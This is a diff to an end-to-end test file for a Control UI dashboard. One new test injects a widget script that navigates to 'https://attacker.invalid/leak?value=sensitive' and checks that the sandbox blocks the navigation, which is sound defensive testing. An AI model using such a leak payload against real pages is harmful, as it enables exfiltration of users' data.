@@ -1,7 +1,9 @@
 // Control UI E2E covers the real session-dashboard provider and transcript bridge.
-import { chromium, type Browser } from "playwright";
+import { chromium, type Browser, type Page } from "playwright";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
+import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
+import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
 import {
   canRunPlaywrightChromium,
   installMockGateway,
@@ -72,6 +74,39 @@ const pinnedBoardSnapshot = {
     },
   ],
 };
+const pinnedMcpAppBoardSnapshot = {
+  ...boardSnapshot,
+  revision: 2,
+  widgets: [
+    ...boardSnapshot.widgets,
+    {
+      name: "mcp-app-28b65635ecaa78ac",
+      tabId: "main",
+      title: "Demo App",
+      contentKind: "mcp-app",
+      sizeW: 6,
+      sizeH: 4,
+      position: 1,
+      grantState: "pending",
+      revision: 1,
+      instanceId: "instance-pinned-app",
+    },
+  ],
+};
+
+async function showDashboard(page: Page): Promise<void> {
+  await page.addInitScript((key) => {
+    const settingsKey = "openclaw.control.settings.v1:ws://127.0.0.1:18789";
+    const settings = JSON.parse(localStorage.getItem(settingsKey) ?? "{}") as Record<
+      string,
+      unknown
+    >;
+    settings.boardSessionViews = {
+      [key]: { face: "dashboard", activeTabId: "main" },
+    };
+    localStorage.setItem(settingsKey, JSON.stringify(settings));
+  }, sessionKey);
+}
 
 describeControlUiE2e("Control UI session dashboard stitch", () => {
   beforeAll(async () => {
@@ -82,6 +117,93 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
   afterAll(async () => {
     await browser?.close();
     await server?.close();
+  });
+
+  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
+    const sandboxHost = createSandboxHostHttpServer();
+    await new Promise<void>((resolve, reject) => {
+      sandboxHost.once("error", reject);
+      sandboxHost.listen(0, "127.0.0.1", () => {
+        sandboxHost.off("error", reject);
+        resolve();
+      });
+    });
+    const sandboxAddress = sandboxHost.address();
+    if (!sandboxAddress || typeof sandboxAddress === "string") {
+      throw new Error("sandbox host did not bind a TCP address");
+    }
+    const context = await browser.newContext();
+    try {
+      const page = await context.newPage();
+      const escapeRequests: string[] = [];
+      page.on("request", (request) => {
+        if (request.url().startsWith("https://attacker.invalid/")) {
+          escapeRequests.push(request.url());
+        }
+      });
+      await page.goto(server.baseUrl);
+      await page.evaluate((sandboxUrl) => {
+        Reflect.set(globalThis, "widgetProbes", []);
+        addEventListener("message", (event) => {
+          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
+        });
+        const frame = document.createElement("iframe");
+        frame.src = sandboxUrl;
+        document.body.replaceChildren(frame);
+      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
+      await expect
+        .poll(async () =>
+          page.evaluate(() =>
+            (Reflect.get(globalThis, "widgetProbes") as Array<{ method?: string }>).some(
+              (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
+            ),
+          ),
+        )
+        .toBe(true);
+
+      const widgetHtml = `<!doctype html><html><body><script>
+        parent.postMessage({
+          compatMode: document.compatMode,
+        }, "*");
+        setTimeout(() => {
+          location.href = "https://attacker.invalid/leak?value=sensitive";
+        }, 0);
+      </script></body></html>`;
+      await page.locator("iframe").evaluate((frame, html) => {
+        (frame as HTMLIFrameElement).contentWindow?.postMessage(
+          {
+            method: "ui/notifications/sandbox-resource-ready",
+            params: { html },
+          },
+          "*",
+        );
+      }, widgetHtml);
+      await expect
+        .poll(async () =>
+          page.evaluate(() =>
+            (
+              Reflect.get(globalThis, "widgetProbes") as Array<{
+                compatMode?: string;
+              }>
+            ).filter((probe) => probe?.compatMode),
+          ),
+        )
+        .toEqual([{ compatMode: "CSS1Compat" }]);
+      const sandboxFrame = await page
+        .locator("iframe")
+        .elementHandle()
+        .then((handle) => handle?.contentFrame());
+      const widgetFrame = sandboxFrame?.childFrames()[0];
+      expect(widgetFrame).toBeDefined();
+      await page.waitForTimeout(250);
+      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
+      expect(escapeRequests).toEqual([]);
+    } finally {
+      await context.close();
+      await new Promise<void>((resolve, reject) => {
+        sandboxHost.close((error) => (error ? reject(error) : resolve()));
+      });
+    }
   });
 
   it("pins Canvas HTML, follows board commands, and persists dock resizing", async () => {
@@ -124,17 +246,7 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
         "board.widget.put": pinnedBoardSnapshot,
       },
     });
-    await page.addInitScript((key) => {
-      const settingsKey = "openclaw.control.settings.v1:ws://127.0.0.1:18789";
-      const settings = JSON.parse(localStorage.getItem(settingsKey) ?? "{}") as Record<
-        string,
-        unknown
-      >;
-      settings.boardSessionViews = {
-        [key]: { face: "dashboard", activeTabId: "main" },
-      };
-      localStorage.setItem(settingsKey, JSON.stringify(settings));
-    }, sessionKey);
+    await showDashboard(page);
 
     await page.goto(`${server.baseUrl}chat`);
     await expect
@@ -182,6 +294,75 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
       .poll(() =>
         page.locator('.chat-tool-card__preview[data-kind="canvas"] [data-pin-widget]').isDisabled(),
       )
+      .toBe(true);
+    await context.close();
+  });
+
+  it("pins an inline MCP App using only its session-bound view identity", async () => {
+    const context = await browser.newContext({ viewport: { height: 900, width: 1280 } });
+    const page = await context.newPage();
+    const gateway = await installMockGateway(page, {
+      sessionKey,
+      featureCapabilities: [],
+      featureMethods: [
+        "board.get",
+        "board.widget.appView",
+        "board.widget.put",
+        "chat.metadata",
+        "chat.startup",
+      ],
+      historyMessages: [
+        {
+          role: "assistant",
+          content: [
+            {
+              type: "canvas",
+              preview: {
+                kind: "canvas",
+                surface: "assistant_message",
+                render: "url",
+                title: "Demo App",
+                viewId: "outer-view-must-not-be-pinned",
+                mcpApp: {
+                  viewId: "view-session-bound",
+                  serverName: "forbidden-server",
+                  toolName: "forbidden-tool",
+                  uiResourceUri: "ui://forbidden/app.html",
+                  originSessionKey: sessionKey,
+                  toolCallId: "forbidden-call",
+                },
+              },
+            },
+          ],
+          timestamp: 1,
+        },
+      ],
+      methodResponses: {
+        "board.get": boardSnapshot,
+        "board.widget.appView": {
+          viewId: "view-pinned-lease",
+          expiresAtMs: Date.now() + 60_000,
+        },
+        "board.widget.put": pinnedMcpAppBoardSnapshot,
+      },
+    });
+    await showDashboard(page);
+
+    await page.goto(`${server.baseUrl}chat`);
+    await page.locator(".board-session-surface").waitFor();
+    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
+    await preview.hover();
+    await preview.getByRole("button", { name: "Pin to dashboard" }).click();
+
+    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
+    expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
+      sessionKey,
+      name: "mcp-app-28b65635ecaa78ac",
+      title: "Demo App",
+      content: { kind: "mcp-app", viewId: "view-session-bound" },
+    });
+    await expect
+      .poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled())
       .toBe(true);
     await context.close();
   });
